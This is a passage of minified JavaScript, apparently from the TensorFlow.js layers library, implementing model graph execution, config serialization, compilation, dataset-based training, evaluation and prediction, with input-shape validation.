            for (let c = 0; c < this.inputs.length; ++c) {
                const l = this.inputs[c]
                  , u = t[c]
                  , d = e[c];
                s[l.id] = [u, d]
            }
            const o = Object.keys(this.nodesByDepth).map((c=>parseInt(c, 10))).sort(Kc);
            for (const c of o) {
                const l = this.nodesByDepth[c];
                for (const u of l) {
                    const d = u.outboundLayer
                      , h = u.inputTensors
                      , p = u.outputTensors
                      , f = new Array;
                    for (const m of h)
                        m.id in s && f.push(s[m.id]);
                    if (f.length === h.length) {
                        let g, b, x, I, m = {};
                        if (null != u.callArgs && (m = u.callArgs),
                        1 === f.length) {
                            const [y,w] = f[0];
                            null == m.mask && (m.mask = w),
                            x = Lt(d.call(y, m)),
                            I = Lt(d.computeMask(y, w)),
                            g = [y],
                            b = [w]
                        } else
                            g = f.map((y=>y[0])),
                            b = f.map((y=>y[1])),
                            null == m.mask && (m.mask = b),
                            x = Lt(d.call(g, m)),
                            I = Lt(d.computeMask(g, b));
                        if (d.activityRegularizer)
                            throw new bt("LayersModel invocation with concrete Tensor value(s) in the presence of activity regularizer(s) is not supported yet.");
                        for (let y = 0; y < p.length; ++y) {
                            const w = p[y]
                              , C = x[y]
                              , k = I[y];
                            s[w.id] = [C, k]
                        }
                    }
                }
            }
            const r = []
              , i = []
              , a = [];
            for (const c of this.outputs) {
                Bn(c.id in s, `Could not compute output ${c.name} : ${c.id}`);
                const [l,u] = s[c.id];
                a.push(l.shape),
                r.push(l),
                i.push(u)
            }
            return [r, i, a]
        }
        buildNodeConversionMap(t) {
            const e = {};
            let s;
            for (const o of this.layers) {
                s = o instanceof En ? 1 : 0;
                for (let r = 0; r < o.inboundNodes.length; r++) {
                    const i = En.nodeKey(o, r);
                    this.containerNodes.has(i) && (e[i] = s,
                    s += 1)
                }
            }
            return e
        }
        getLayer(t, e) {
            if (null != e)
                return this.findLayer(e);
            if (null == t)
                throw new $("Provide either a layer name or layer index");
            if ("number" == typeof t)
                return this.findLayer(t);
            for (const s of this.layers)
                if (s.name === t)
                    return s;
            throw new $(`No such layer: ${t}`)
        }
        findLayer(t) {
            if (this.layers.length <= t)
                throw new $(`Was asked to retrieve layer at index ${t}, but model only has ${this.layers.length} layer(s).`);
            return this.layers[t]
        }
        calculateLosses() {
            return M((()=>{
                const t = [];
                for (const e of this.layers)
                    for (let s = 0; s < e.inboundNodes.length; ++s) {
                        const o = En.nodeKey(e, s);
                        this.containerNodes.has(o) && t.push(...e.calculateLosses())
                    }
                return t
            }
            ))
        }
        getConfig() {
            const t = {
                name: this.name
            }
              , e = this.buildNodeConversionMap(this.layers)
              , s = [];
            for (const i of this.layers) {
                const a = i.getClassName()
                  , c = i.getConfig()
                  , l = [];
                for (let d = 0; d < i.inboundNodes.length; d++) {
                    const h = i.inboundNodes[d]
                      , p = En.nodeKey(i, d);
                    let f = {};
                    if (this.containerNodes.has(p)) {
                        if (h.callArgs)
                            try {
                                JSON.stringify(h.callArgs),
                                f = h.callArgs
                            } catch {
                                console.warn(`Layer ${i.name} was passed non-serializable keyword arguments: ${h.callArgs}. They will not be included in the serialized model (and thus will be missing at deserialization time).`),
                                f = {}
                            }
                        if (h.inboundLayers.length > 0) {
                            const m = [];
                            for (let g = 0; g < h.inboundLayers.length; g++) {
                                const b = h.inboundLayers[g]
                                  , x = h.nodeIndices[g]
                                  , I = h.tensorIndices[g];
                                let w = e[En.nodeKey(b, x)];
                                null == w && (w = 0),
                                m.push([b.name, w, I, f])
                            }
                            l.push(m)
                        }
                    }
                }
                const u = {};
                u.name = i.name,
                u.className = a,
                u.config = c,
                u.inboundNodes = l,
                s.push(u)
            }
            t.layers = s;
            const o = [];
            for (let i = 0; i < this.inputLayers.length; i++) {
                const a = this.inputLayers[i]
                  , c = this.inputLayersNodeIndices[i]
                  , l = En.nodeKey(a, c);
                if (!this.containerNodes.has(l))
                    continue;
                let u = e[l];
                null == u && (u = 0);
                const d = this.inputLayersTensorIndices[i];
                o.push([a.name, u, d])
            }
            t.inputLayers = o;
            const r = [];
            for (let i = 0; i < this.outputLayers.length; i++) {
                const a = this.outputLayers[i]
                  , c = this.outputLayersNodeIndices[i]
                  , l = En.nodeKey(a, c);
                if (!this.containerNodes.has(l))
                    continue;
                let u = e[l];
                null == u && (u = 0);
                const d = this.outputLayersTensorIndices[i];
                r.push([a.name, u, d])
            }
            return t.outputLayers = r,
            t
        }
        static fromConfig(t, e, s={}, o=!1) {
            const r = {}
              , i = {};
            function a(g, b) {
                g.name in i ? i[g.name].push(b) : i[g.name] = [b]
            }
            function c(g, b) {
                const x = [];
                let I;
                for (const y of b) {
                    const w = y[0]
                      , C = y[1]
                      , k = y[2];
                    if (I = null == y[3] ? {} : y[3],
                    !(w in r))
                        return void a(g, b);
                    const S = r[w];
                    if (S.inboundNodes.length <= C)
                        return void a(g, b);
                    const T = S.inboundNodes[C];
                    x.push(T.outputTensors[k])
                }
                x.length > 0 && g.apply(Pe(x), I)
            }
            function l(g) {
                const b = g.name
                  , x = us(g, null != e.customObjects ? e.customObjects : {});
                x.setFastWeightInitDuringBuild(o),
                r[b] = x,
                g.inboundNodes.forEach((y=>{
                    if (!(y instanceof Array))
                        throw new $(`Corrupted configuration, expected array for nodeData: ${y}`);
                    a(x, y)
                }
                ))
            }
            const u = e.name
              , d = e.layers;
            for (const g of d)
                l(g);
            for (; !XR(i); )
                for (const g of d) {
                    const b = r[g.name];
                    if (b.name in i) {
                        const x = i[b.name];
                        delete i[b.name];
                        for (const I of x)
                            c(b, I)
                    }
                }
            const h = []
              , p = []
              , f = e.inputLayers;
            for (const g of f) {
                const b = g[0]
                  , x = g[1]
                  , I = g[2];
                Bn(b in r);
                const w = r[b].inboundNodes[x].outputTensors;
                h.push(w[I])
            }
            const m = e.outputLayers;
            for (const g of m) {
                const b = g[0]
                  , x = g[1]
                  , I = g[2];
                Bn(b in r);
                const w = r[b].inboundNodes[x].outputTensors;
                p.push(w[I])
            }
            return new t({
                inputs: h,
                outputs: p,
                name: u
            })
        }
        get stateful() {
            if (this._stateful)
                throw new $("Container instance unexpectedly has _stateful = true. The statefulness of a Container is determined by the Layers it contains. Its _stateful property must remain the default false.");
            for (const t of this.layers)
                if (t.stateful)
                    return !0;
            return !1
        }
        resetStates() {
            M((()=>{
                this.layers.forEach((t=>{
                    t.stateful && t.resetStates()
                }
                ))
            }
            ))
        }
    }
    function Q0(n, t) {
        return function eG(n, t, e) {
            const s = t.length;
            if (null == n || Array.isArray(n) && 0 === n.length)
                return t.map((o=>null));
            if (1 === s)
                return Array.isArray(n) && 1 === n.length ? n : "object" == typeof n && t[0]in n ? [n[t[0]]] : [n];
            if (Array.isArray(n)) {
                if (n.length !== s)
                    throw new Error(`Provided ${e} is an array of ${n.length} element(s), but the model has ${s} outputs. Make sure a set of weights is provided for each model output.`);
                return n
            }
            if ("object" == typeof n && Object.keys(n).length > 0 && "object" == typeof n[Object.keys(n)[0]]) {
                const o = [];
                return t.forEach((r=>{
                    r in n ? o.push(n[r]) : o.push(null)
                }
                )),
                o
            }
            throw new Error(`The model has multiple (${s}) outputs, so ${e} must be either an array with ${s} elements or an object with ${t} keys. Provided ${e} not understood: ${JSON.stringify(n)}`)
        }(n, t, "classWeight")
    }
    async function J0(n, t, e, s) {
        if (null != t || null != s)
            throw new Error("Support sampleWeight is not implemented yet");
        if (null != e) {
            const o = M((()=>{
                if (1 === n.shape.length)
                    return to(n);
                if (2 === n.shape.length) {
                    if (n.shape[1] > 1)
                        return vi(n, 1);
                    if (1 === n.shape[1])
                        return W(n, [n.shape[0]]);
                    throw new Error(`Encountered unexpected last-dimension size (${n.shape[1]}) during handling of class weights. The size is expected to be >= 1.`)
                }
                throw new Error(`Unexpected rank of target (y) tensor (${n.rank}) during handling of class weights. The rank is expected to be 1 or 2.`)
            }
            ))
              , r = Array.from(await o.data());
            vt(o);
            const i = [];
            return r.forEach((a=>{
                if (null == e[a])
                    throw new Error(`classWeight must contain all classes in the training data. The class ${a} exists in the data but not in classWeight`);
                i.push(e[a])
            }
            )),
            Ue(i, "float32")
        }
        return null
    }
    function nG(n, t) {
        return E(n, t)
    }
    function j0(n, t) {
        let e, s;
        const o = t;
        e = o.xs,
        s = o.ys,
        v(null != e && null != s, (()=>`A Dataset iterator for fitDataset() is expected to generate objects of the form \`{xs: xVal, ys: yVal}\`, where the two values may be \`tf.Tensor\`, an array of Tensors, or a map of string to Tensor.  The provided Dataset instead generates ${t}`));
        const r = q0("input", n.inputNames, e)
          , i = q0("output", n.outputNames, s)
          , a = r[0].shape[0];
        v(r.length === n.inputs.length, (()=>`LayersModel has ${n.inputs.length} inputs, but the dataset provides ${r.length} inputs.  (Expected input keys: ${JSON.stringify(n.inputNames)})`)),
        v(i.length === n.outputs.length, (()=>`LayersModel has ${n.outputs.length} outputs, but the dataset provides ${i.length} outputs.  (Expected output keys: ${JSON.stringify(n.outputNames)})`));
        for (let c = 0; c < r.length; c++)
            v(r[c].shape[0] === a, (()=>`Batch size mismatch: input ${n.inputNames[c]} has ${r[c].shape[0]}; expected  ${a} based on input ${n.inputNames[0]}.`));
        for (let c = 0; c < i.length; c++)
            v(i[c].shape[0] === a, (()=>`Batch size mismatch: output ${n.outputNames[c]} has ${i[c].shape[0]}; expected  ${a} based on input ${n.inputNames[0]}.`));
        return {
            xs: r,
            ys: i
        }
    }
    function q0(n, t, e) {
        if (e instanceof ae)
            return [e];
        if (Array.isArray(e))
            return v(e.length === t.length, (()=>`Received an array of ${e.length} Tensors, but expected ${t.length} to match the ${n} keys ${t}.`)),
            e;
        {
            const s = [];
            for (const o of t) {
                if (null == e[o])
                    throw new $(`The feature data generated by the dataset lacks the required ${n} key '${o}'.`);
                s.push(e[o])
            }
            return s
        }
    }
    async function rG(n, t, e) {
        const s = null != e.batchesPerEpoch;
        if (v(null != n.optimizer, (()=>"You must compile a model before training/testing. Use LayersModel.compile(modelCompileConfig).")),
        v(null != e, (()=>"For fitDataset(), the 2nd argument (config) is required, but it is not provided in this call.")),
        v(null != e.epochs && e.epochs > 0 && Number.isInteger(e.epochs), (()=>`For fitDataset(), config.epochs is expected to be a positive integer, but got ${e.epochs}`)),
        v(!s || e.batchesPerEpoch > 0 && Number.isInteger(e.batchesPerEpoch), (()=>`For fitDataset(), config.batchesPerEpoch is expected to be a positive integer if specified, but got ${e.batchesPerEpoch}`)),
        v(null == e.validationSplit, (()=>"`validationSplit` is not supported by `fitDataset()`. Use validationData instead.")),
        n.isTraining)
            throw new Error("Cannot start training because another fit() call is ongoing.");
        n.isTraining = !0;
        try {
            const o = null != e.validationData;
            let r, i;
            if (o)
                if (tb(e.validationData))
                    v(null == e.validationBatches || e.validationBatches > 0 && Number.isInteger(e.validationBatches), (()=>`For fitDataset() with dataset-based validation, config.validationBatches is expected not to be provided, or to be a positive integer, but got ${e.validationBatches}`));
                else {
                    const g = function oG(n) {
                        if (3 === n.length)
                            throw new bt("Validation with sample weights is not implemented yet.");
                        return {
                            xs: n[0],
                            ys: n[1]
                        }
                    }(e.validationData);
                    r = g.xs,
                    i = g.ys
                }
            const a = n.makeTrainFunction()
              , c = n.getDedupedMetricsNames();
            let l;
            l = o ? c.slice().concat(c.map((g=>"val_" + g))) : c.slice();
            const u = X0(e.callbacks, e.yieldEvery)
              , d = null == e.verbose ? 1 : e.verbose
              , {callbackList: h, history: p} = A0(u, d, e.epochs, null, null, function iG(n, t) {
                let e = null;
                return null != t.batchesPerEpoch ? e = t.batchesPerEpoch : Number.isFinite(n.size) && (e = n.size),
                e
            }(t, e), null, o, l);
            h.setModel(n),
            n.history = p,
            await h.onTrainBegin(),
            n.stopTraining_ = !1;
            let f = null == e.initialEpoch ? 0 : e.initialEpoch
              , m = await t.iterator();
            for (; f < e.epochs; ) {
                const g = {};
                await h.onEpochBegin(f);
                let b = 0
                  , x = 0;
                for (s || (m = await t.iterator()); !s || b < e.batchesPerEpoch; ) {
                    const I = await m.next();
                    if (s && I.done) {
                        console.warn(`You provided \`batchesPerEpoch\` as ${e.batchesPerEpoch}, but your dataset iterator ran out of data after ${b} batches; interrupting training. Make sure that your dataset can generate at least \`batchesPerEpoch * epochs\` batches (in this case, ${e.batchesPerEpoch * e.epochs} batches). You may need to use the repeat() function when building your dataset.`);
                        break
                    }
                    if (null != I.value) {
                        const {xs: y, ys: w} = j0(n, I.value)
                          , C = {};
                        C.batch = x,
                        C.size = y[0].shape[0],
                        await h.onBatchBegin(x, C);
                        const k = [];
                        if (null != e.classWeight) {
                            const R = Q0(e.classWeight, n.outputNames);
                            for (let L = 0; L < R.length; ++L)
                                k.push(await J0(w[L], null, R[L]))
                        }
                        const S = y.concat(w).concat(k)
                          , T = a(S);
                        vt(S);
                        for (let R = 0; R < c.length; ++R) {
                            const L = c[R]
                              , V = T[R];
                            C[L] = V,
                            en(V)
                        }
                        await h.onBatchEnd(x, C),
                        F0(C),
                        x++,
                        b++
                    }
                    if (s ? b >= e.batchesPerEpoch : I.done) {
                        if (o) {
                            let y;
                            y = tb(e.validationData) ? Lt(await n.evaluateDataset(e.validationData, {
                                batches: e.validationBatches
                            })) : Lt(n.evaluate(r, i, {
                                batchSize: null == e.validationBatchSize ? 32 : e.validationBatchSize,
                                verbose: 0
                            }));
                            for (let w = 0; w < n.metricsNames.length; ++w)
                                g[`val_${n.metricsNames[w]}`] = y[w]
                        }
                        break
                    }
                    if (n.stopTraining_)
                        break
                }
                if (await h.onEpochEnd(f, g),
                f++,
                n.stopTraining_)
                    break
            }
            return await h.onTrainEnd(),
            await n.history.syncData(),
            n.history
        } finally {
            n.isTraining = !1
        }
    }
    function tb(n) {
        return "function" == typeof n.iterator
    }
    function Jh(n) {
        v(n > 0 && Number.isInteger(n), (()=>`batchSize is required to be a positive integer, but got ${n}`))
    }
    function Ui(n, t, e) {
        return null == n ? [null] : Array.isArray(n) ? n.map((s=>go(s, t, e - t))) : go(n, t, e - t)
    }
    function jh(n, t) {
        return M((()=>null == n ? null : Array.isArray(n) ? n.map((e=>jh(e, t))) : b0(n, "int32" === t.dtype ? t : st(t, "int32"))))
    }
    function qh(n, t) {
        const e = [];
        let s = 0
          , o = null;
        for (; s < n; )
            o = s + t,
            o >= n && (o = n),
            e.push([s, o]),
            s = o;
        return e
    }
    function eb(n) {
        const t = [];
        n instanceof ae && (n = [n]);
        for (let e = 0; e < n.length; ++e) {
            const s = n[e];
            if (1 === s.rank)
                t.push(Ai(s, 1));
            else {
                if (0 === s.rank)
                    throw new Error("Expected tensor to be at least 1D, but received a 0D tensor (scalar).");
                t.push(s)
            }
        }
        return t
    }
    function Dn(n, t) {
        if (null == n)
            return;
        const e = [];
        if (t instanceof ae)
            e.push(t.id);
        else if (Array.isArray(t))
            t.forEach((o=>e.push(o.id)));
        else if (null != t)
            for (const o in t) {
                const r = t[o];
                e.push(r.id)
            }
        const s = [];
        if (n instanceof ae)
            -1 === e.indexOf(n.id) && s.push(n);
        else if (Array.isArray(n))
            n.forEach((o=>{
                -1 === e.indexOf(o.id) && s.push(o)
            }
            ));
        else if (null != n)
            for (const o in n) {
                const r = n[o];
                -1 === e.indexOf(r.id) && s.push(r)
            }
        s.forEach((o=>{
            o.isDisposed || o.dispose()
        }
        ))
    }
    function tp(n) {
        return Array.isArray(n)
    }
    function nb(n) {
        return !function lG(n) {
            return n instanceof ae
        }(n) && !tp(n)
    }
    function sb(n, t, e, s=!0, o="") {
        if (null == t || 0 === t.length) {
            if (null != n) {
                let i = !1;
                if (tp(n) && n.length > 0)
                    i = !0;
                else if (nb(n)) {
                    for (const a in n)
                        if (n.hasOwnProperty(a)) {
                            i = !0;
                            break
                        }
                } else
                    i = !0;
                if (i)
                    throw new $(`Error when checking model ${o} expected no data, but got ${n}`)
            }
            return []
        }
        if (null == n)
            return t.map((i=>null));
        let r;
        if (nb(n)) {
            r = [];
            for (const i of t) {
                if (null == n[i])
                    throw new $(`No data provided for "${i}". Need data for each key in: ${t}`);
                r.push(n[i])
            }
        } else if (tp(n)) {
            if (n.length !== t.length)
                throw new $(`Error when checking model ${o}: the Array of Tensors that you are passing to your model is not the size the model expected. Expected to see ${t.length} Tensor(s), but instead got the following list of Tensor(s): ${n}`);
            r = n
        } else {
            if (t.length > 1)
                throw new $(`The model ${o} expects ${t.length} Tensor(s), but only received one Tensor. Found: Tensor with shape ${n.shape}`);
            r = [n]
        }
        if (r = eb(r),
        null != e)
            for (let i = 0; i < t.length; ++i) {
                if (null == e[i])
                    continue;
                const a = r[i];
                if (a.shape.length !== e[i].length)
                    throw new $(`Error when checking ${o}: expected ${t[i]} to have ${e[i].length} dimension(s). but got array with shape ${a.shape}`);
                for (let c = 0; c < e[i].length; ++c) {
                    if (0 === c && !s)
                        continue;
                    const l = a.shape[c]
                      , u = e[i][c];
                    if (null != u && u >= 0 && l !== u)
                        throw new $(`${o} expected a batch of elements where each example has shape [${e[i].slice(1, e[i].length)}] (i.e.,tensor shape [*,${e[i].slice(1, e[i].length)}]) but the ${o} received an input with ${a.shape[0]} examples, each with shape [${a.shape.slice(1, a.shape.length)}] (tensor shape [${a.shape}])`)
                }
            }
        return r
    }
    function ob(n, t, e, s=!0, o="") {
        let r;
        if (Array.isArray(n)) {
            if (n.length !== t.length)
                throw new $(`Error when checking model ${o}: the Array of Tensors that you are passing to your model is not the size the the model expected. Expected to see ${t.length} Tensor(s), but instead got ${n.length} Tensors(s).`);
            r = n
        } else {
            if (t.length > 1)
                throw new $(`The model expects ${t.length} ${o} Tensors, but only received one Tensor. Found: array with shape ${JSON.stringify(n.shape)}.`);
            r = [n]
        }
        if (null != e)
            for (let i = 0; i < t.length; ++i) {
                if (null == e[i])
                    continue;
                const a = r[i];
                if (a.shape.length !== e[i].length)
                    throw new $(`Error when checking ${o}: expected ${t[i]} to have ${e[i].length} dimension(s), but got array with shape ${JSON.stringify(a.shape)}`);
                for (let c = 0; c < e[i].length; ++c) {
                    if (0 === c && !s)
                        continue;
                    const l = a.shape[c]
                      , u = e[i][c];
                    if (null != u && u !== l)
                        throw new $(`Error when checking ${o}: expected ${t[i]} to have shape ${JSON.stringify(e[i])} but got array with shape ${JSON.stringify(a.shape)}.`)
                }
            }
    }
    class sr extends En {
        constructor(t) {
            super(t),
            this.isTraining = !1
        }
        summary(t, e, s=console.log) {
            if (!this.built)
                throw new $("This model has never been called, thus its weights have not been created yet. So no summary can be displayed. Build the model first (e.g., by calling it on some test data).");
            Y$(this, t, e, s)
        }
        compile(t) {
            if (null == t.loss && (t.loss = []),
            this.loss = t.loss,
            "string" == typeof t.optimizer)
                this.optimizer_ = function U$(n) {
                    const t = {
                        Adagrad: ()=>tr.adagrad(.01),
                        Adadelta: ()=>tr.adadelta(1, .95, le()),
                        Adam: ()=>tr.adam(.001, .9, .999, le()),
                        Adamax: ()=>tr.adamax(.002, .9, .999, le(), 0),
                        RMSProp: ()=>tr.rmsprop(.001, .9, 0, le()),
                        SGD: ()=>tr.sgd(.01)
                    };
                    if (t.adagrad = t.Adagrad,
                    t.adadelta = t.Adadelta,
                    t.adam = t.Adam,
                    t.adamax = t.Adamax,
                    t.rmsprop = t.RMSProp,
                    t.sgd = t.SGD,
                    n in t)
                        return t[n]();
                    throw new $(`Unknown Optimizer ${n}`)
                }(t.optimizer),
                this.isOptimizerOwned = !0;
            else {
                if (!(t.optimizer instanceof ks))
                    throw new $("User-defined optimizer must be an instance of tf.Optimizer.");
                this.optimizer_ = t.optimizer,
                this.isOptimizerOwned = !1
            }
            let e = [];
            if (Array.isArray(t.loss) || "string" == typeof t.loss || "function" == typeof t.loss)
                if (Array.isArray(t.loss)) {
                    if (t.loss.length !== this.outputs.length)
                        throw new $(`When passing an Array as loss, it should have one entry per model output. The model has ${this.outputs.length} output(s), but you passed loss=${t.loss}.`);
                    e = t.loss.map((a=>_h(a)))
                } else {
                    const i = _h(t.loss);
                    this.outputs.forEach((a=>{
                        e.push(i)
                    }
                    ))
                }
            else {
                t.loss = t.loss;
                for (const i in t.loss)
                    if (-1 === this.outputNames.indexOf(i))
                        throw new $(`Unknown entry in loss dictionary: "${i}". Only expected the following keys: ${this.outputNames}`);
                for (const i of this.outputNames)
                    null == t.loss[i] && console.warn(`Output "${i}" is missing from loss dictionary. We assume this was done on purpose, and we will not be expecting data to be passed to ${i} during training`),
                    e.push(_h(t.loss[i]))
            }
            this.lossFunctions = e,
            this.feedOutputNames = [],
            this.feedOutputShapes = [],
            this.feedLossFns = [];
            for (let i = 0; i < this.outputs.length; ++i) {
                const a = this.internalOutputShapes[i]
                  , c = this.outputNames[i];
                this.feedOutputNames.push(c),
                this.feedOutputShapes.push(a),
                this.feedLossFns.push(this.lossFunctions[i])
            }
            const s = [];
            this.metrics = t.metrics,
            this.metricsNames = ["loss"],
            this.metricsTensors = [],
            mo("loss", (()=>{
                for (let i = 0; i < this.outputs.length; ++i) {
                    if (-1 !== s.indexOf(i))
                        continue;
                    const a = this.lossFunctions[i];
                    this.outputs.length > 1 && (this.metricsTensors.push([a, i]),
                    this.metricsNames.push(this.outputNames[i] + "_loss"))
                }
            }
            ));
            const o = function hG(n, t) {
                if (null == n || Array.isArray(n) && 0 === n.length)
                    return t.map((s=>[]));
                let e;
                if ("string" == typeof n || "function" == typeof n)
                    e = [n];
                else {
                    if (!Array.isArray(n) && "object" != typeof n)
                        throw new TypeError(`Type of metrics argument not understood. Expected an string,function, Array, or Object, found: ${n}`);
                    e = n
                }
                if (Array.isArray(e))
                    return t.map((s=>e));
                {
                    const s = [];
                    for (const o of t) {
                        let r = e.hasOwnProperty(o) ? e[o] : [];
                        Array.isArray(r) || (r = [r]),
                        s.push(r)
                    }
                    return s
                }
            }(t.metrics, this.outputNames)
              , r = (i,a,c)=>{
                this.outputNames.length > 1 && (a = this.outputNames[i] + "_" + a),
                this.metricsNames.push(a),
                this.metricsTensors.push([c, i])
            }
            ;
            mo("metric", (()=>{
                for (let i = 0; i < this.outputs.length; ++i) {
                    if (-1 !== s.indexOf(i))
                        continue;
                    (l=>{
                        let d, h, p;
                        for (const f of l) {
                            if ("string" == typeof f && -1 !== ["accuracy", "acc", "crossentropy", "ce"].indexOf(f)) {
                                const g = this.internalOutputShapes[i];
                                let b;
                                1 === g[g.length - 1] || this.lossFunctions[i] === nl ? -1 !== ["accuracy", "acc"].indexOf(f) ? h = O0 : -1 !== ["crossentropy", "ce"].indexOf(f) && (h = z$) : this.lossFunctions[i] === el ? -1 !== ["accuracy", "acc"].indexOf(f) ? h = X$ : -1 !== ["crossentropy", "ce"].indexOf(f) && (h = B0) : -1 !== ["accuracy", "acc"].indexOf(f) ? h = K0 : -1 !== ["crossentropy", "ce"].indexOf(f) && (h = Z0),
                                -1 !== ["accuracy", "acc"].indexOf(f) ? b = "acc" : -1 !== ["crossentropy", "ce"].indexOf(f) && (b = "ce"),
                                p = h,
                                d = "" + b
                            } else
                                p = _$(f),
                                d = "" + rl(f);
                            let m;
                            mo(d, (()=>{
                                m = p
                            }
                            )),
                            r(i, d, m)
                        }
                    }
                    )(o[i])
                }
            }
            )),
            this.collectedTrainableWeights = this.trainableWeights
        }
        checkTrainableWeightsConsistency() {
            null != this.collectedTrainableWeights && this.trainableWeights.length !== this.collectedTrainableWeights.length && console.warn("Discrepancy between trainableweights and collected trainable weights. Did you set `model.trainable` without calling `model.compile()` afterwards?")
        }
        evaluate(t, e, s={}) {
            const o = null == s.batchSize ? 32 : s.batchSize;
            Jh(o);
            const i = this.standardizeUserDataXY(t, e, !0, o);
            try {
                const a = i[0].concat(i[1]);
                this.makeTestFunction();
                const c = this.testFunction;
                return Pe(this.testLoop(c, a, o, s.verbose, s.steps))
            } finally {
                Dn(i[0], t),
                Dn(i[1], e)
            }
        }
        async evaluateDataset(t, e) {
            return this.makeTestFunction(),
            async function cG(n, t, e) {
                const s = null != (e = e || {}).batches
                  , o = n.testFunction;
                let r = [];
                if (e.verbose > 0)
                    throw new bt("Verbose mode is not implemented yet.");
                v(!s || e.batches > 0 && Number.isInteger(e.batches), (()=>`Test loop expects \`batches\` to be a positive integer, but received ${JSON.stringify(e.batches)}`));
                const i = function aG(n) {
                    return "function" == typeof n.next
                }(t) ? t : await t.iterator();
                let a = 0
                  , c = 0;
                for (; !s || c < e.batches; ) {
                    const l = await i.next();
                    if (r = M((()=>{
                        if (l.value) {
                            const {xs: u, ys: d} = j0(n, l.value)
                              , h = u.concat(d)
                              , p = M((()=>o(h)));
                            if (vt(h),
                            0 === c)
                                for (let m = 0; m < p.length; ++m)
                                    r.push(Gt(0));
                            const f = h[0].shape[0];
                            for (let m = 0; m < p.length; ++m) {
                                const g = p[m]
                                  , b = r[m];
                                r[m] = M((()=>Q(r[m], E(f, g)))),
                                c > 0 && vt(b)
                            }
                            vt(p),
                            a += f,
                            ++c
                        }
                        return r
                    }
                    )),
                    l.done) {
                        s && console.warn(`Your dataset iterator ran out of data during evaluateDataset(). Interrupting evalution. Make sure that your dataset can generate at least \`batches\` batches (in this case, ${e.batches} batches). You may need to use the repeat() function when building your dataset.`);
                        break
                    }
                }
                for (let l = 0; l < r.length; ++l) {
                    const u = r[l];
                    r[l] = dt(r[l], a),
                    vt(u)
                }
                return Pe(r)
            }(this, t, e)
        }
        checkNumSamples(t, e, s, o="steps") {
            let r;
            if (null != s) {
                if (r = null,
                null != e)
                    throw new $(`If ${o} is set, batchSize must be null or undefined.Got batchSize = ${e}`)
            } else {
                if (null == t)
                    throw new $(`Either the input data should have a defined shape, or ${o} shoud be specified.`);
                r = Array.isArray(t) ? t[0].shape[0] : t.shape[0]
            }
            return r
        }
        execute(t, e) {
            if (Array.isArray(e) && 0 === e.length)
                throw new $("`outputs` is an empty Array, which is not allowed.");
            const s = Array.isArray(e)
              , o = s ? e : [e]
              , r = this.retrieveSymbolicTensors(o)
              , i = new $s;
            if (t instanceof ae && (t = [t]),
            Array.isArray(t)) {
                if (t.length !== this.inputs.length)
                    throw new $(`The number of inputs provided (${t.length}) does not match the number of inputs of this model (${this.inputs.length}).`);
                for (let c = 0; c < this.inputs.length; ++c)
                    i.add(this.inputs[c], t[c])
            } else
                for (const c of this.inputs) {
                    const l = t[c.name];
                    if (null == l)
                        throw new $(`No value is provided for the model's input ${c.name}`);
                    i.add(c, l)
                }
            const a = Zi(r, i);
            return s ? a : a[0]
        }
        retrieveSymbolicTensors(t) {
            const e = ho(null, t.length);
            let s = t.length;
            for (const o of this.layers) {
                const r = Array.isArray(o.output) ? o.output : [o.output]
                  , i = r.map((a=>a.name));
                for (let a = 0; a < t.length; ++a) {
                    const c = i.indexOf(t[a]);
                    if (-1 !== c && (e[a] = r[c],
                    s--),
                    0 === s)
                        break
                }
                if (0 === s)
                    break
            }
            if (s > 0) {
                const o = [];
                throw e.forEach(((r,i)=>{
                    null == r && o.push(t[i])
                }
                )),
                new $(`Cannot find SymbolicTensors for output name(s): ${JSON.stringify(o)}`)
            }
            return e
        }
        predictLoop(t, e=32, s=!1) {
            return M((()=>{
                const o = this.checkNumSamples(t);
                if (s)
                    throw new bt("Verbose predictLoop() is not implemented yet.");
                const r = qh(o, e)
                  , i = this.outputs.map((a=>[]));
                for (let a = 0; a < r.length; ++a)
                    M((()=>{
                        const l = r[a][0]
                          , u = r[a][1]
                          , d = Ui(t, l, u)
                          , h = [];
                        if (Array.isArray(d))
                            for (let f = 0; f < d.length; ++f)
                                h.push({
                                    key: this.inputs[f],
                                    value: d[f]
                                });
                        else
                            h.push({
                                key: this.inputs[0],
                                value: d
                            });
                        const p = new $s(h);
                        return Zi(this.outputs, p)
                    }
                    )).forEach(((l,u)=>i[u].push(l)));
                return Pe(i.map((a=>Xe(a, 0))))
            }
            ))
        }
        predict(t, e={}) {
            const s = eb(t);
            ob(s, this.inputNames, this.feedInputShapes, !1);
            try {
                const o = null == e.batchSize ? 32 : e.batchSize;
                return Jh(o),
                this.predictLoop(s, o)
            } finally {
                Dn(s, t)
            }
        }
        predictOnBatch(t) {
            ob(t, this.inputNames, this.feedInputShapes, !0);
            const e = (Array.isArray(t) ? t[0] : t).shape[0];
            return this.predictLoop(t, e)
        }
        standardizeUserDataXY(t, e, s=!0, o) {
            if (null == this.optimizer_)
                throw new gn("You must compile a model before training/testing. Use LayersModel.compile(modelCompileArgs).");
            const r = [];
            for (let i = 0; i < this.feedOutputShapes.length; ++i) {
                const a = this.feedOutputShapes[i];
                this.feedLossFns[i] === el ? r.push(a.slice(0, a.length - 1).concat([1])) : r.push(a)
            }
            if (function uG(n, t, e) {
                const s = Ts(n.map((r=>r.shape[0])));
                s.sort();
                const o = Ts(t.map((r=>r.shape[0])));
                if (o.sort(),
                s.length > 1)
                    throw new $(`All input Tensors (x) should have the same number of samples. Got array shapes: ${JSON.stringify(n.map((r=>r.shape)))}`);
                if (o.length > 1)
                    throw new $(`All target Tensors (y) should have the same number of samples. Got array shapes: ${JSON.stringify(t.map((r=>r.shape)))}`);
                if (s.length > 0 && o.length > 0 && !Rt(s, o))
                    throw new $(`Input Tensors should have the same number of samples as target Tensors. Found ${s[0]} input sample(s) and ${o[0]} target sample(s).`)
            }(t = sb(t, this.feedInputNames, this.feedInputShapes, !1, "input"), e = sb(e, this.feedOutputNames, r, !1, "target")),
            function dG(n, t, e) {
                const s = [tl, nl, _i];
                for (let o = 0; o < n.length; ++o) {
                    const r = n[o]
                      , i = t[o]
                      , a = e[o];
                    if (null != i) {
                        if (i === _i && 1 === r.shape[r.shape.length - 1])
                            throw new $(`You are passing a target array of shape ${r.shape} while using a loss 'categorical_crossentropy'. 'categorical_crossentropy'expects targets to be binary matrices (1s and 0s) of shape [samples, classes].`);
                        if (-1 !== s.indexOf(i)) {
                            const c = r.shape.slice(1)
                              , l = a.slice(1);
                            for (let u = 0; u < c.length; ++u) {
                                const d = c[u]
                                  , h = l[u];
                                if (null != h && d !== h)
